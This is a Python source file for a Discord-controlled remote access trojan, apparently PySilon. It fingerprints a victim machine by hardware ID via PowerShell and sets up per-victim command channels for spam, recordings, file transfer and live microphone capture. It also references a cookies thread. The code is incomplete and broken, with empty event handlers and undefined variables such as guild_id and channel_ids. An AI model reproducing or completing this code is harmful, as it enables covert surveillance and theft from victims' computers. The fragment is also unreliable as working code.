import configparser
import socket
import platform
import psutil
import requests
import discord
from discord.ext import commands
import threading
import subprocess
import wmi
import asyncio


config_file_path = 'config.ini'
config = configparser.ConfigParser()
config.read(config_file_path)
BOT_TOKEN = config['Settings']['token']
GUILD_ID = config['Settings']['server_id']
GUILD_ID = int(GUILD_ID)
intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
c = wmi.WMI()
client = discord.Client(intents=discord.Intents.all())



@client.event
async def on_ready():
    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread, latest_messages_in_recordings
    # .log BOT loaded
    hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID").decode().strip()
    # .log HWID obtained
    first_run = True
    for category_name in client.get_guild(guild_id).categories:
        if hwid in str(category_name):
            first_run, category = False, category_name
            break
    # .log Checked for the first run

    if not first_run:
        # .log PySilon is not running for the first time
        category_channel_names = []
        for channel in category.channels:
            category_channel_names.append(channel.name)
        # .log Obtained the channel names in HWID category

        if 'spam' not in category_channel_names and channel_ids['spam']:
            # .log Spam channel is missing
            temp = await client.get_guild(guild_id).create_text_channel('spam', category=category)
            channel_ids['spam'] = temp.id
            # .log Created spam channel

        if 'recordings' not in category_channel_names and channel_ids['recordings']:
            # .log Recording channel is missing
            temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category)
            channel_ids['recordings'] = temp.id
            # .log Created recordings channel

        if 'file-related' not in category_channel_names and channel_ids['file']:
            # .log File-related channel is missing
            temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category)
            channel_ids['file'] = temp.id
            # .log Created file-related channel

        if 'Live microphone' not in category_channel_names and channel_ids['voice']:
            # .log Live microphone channel is missing
            temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
            channel_ids['voice'] = temp.id
            # .log Created live microphone channel

@client.event
async def on_raw_reaction_add(payload):

@client.event
async def on_reaction_add(reaction, user):

@client.event
async def on_raw_reaction_remove(payload):
        #.log Unpinned reacted message